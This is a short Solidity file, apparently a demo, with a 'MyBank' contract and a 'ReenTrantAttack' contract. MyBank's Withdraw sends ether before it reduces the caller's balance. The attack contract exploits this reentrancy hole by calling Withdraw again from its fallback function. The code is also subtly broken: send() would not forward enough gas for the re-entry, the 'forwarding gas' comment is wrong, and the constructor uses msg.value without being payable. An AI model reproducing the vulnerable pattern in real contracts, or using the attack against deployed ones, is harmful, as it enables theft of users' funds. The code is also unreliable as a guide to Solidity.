pragma solidity ^0.4.0;


contract MyBank {
 
    mapping (address=>uint) balances;

function Deposit() payable external{
   balances[msg.sender] += msg.value;
}

function Withdraw(uint amount) payable {
   if(balances[msg.sender] >= amount) {
      msg.sender.send(amount);
      balances[msg.sender] -= amount;
   }
}
function Balance() constant returns(uint) {
   return balances[msg.sender];
 }
}


contract ReenTrantAttack {
   uint balance;
   MyBank bank = MyBank(0xdeadbeef8badf00d);

constructor () public{
   balance = msg.value;
   bank.Deposit.value(balance)();
   bank.Withdraw.value(0)(balance); // forwarding gas
}

 function () public payable{ // fallback function
   bank.Withdraw.value(0)(balance);
    }
}
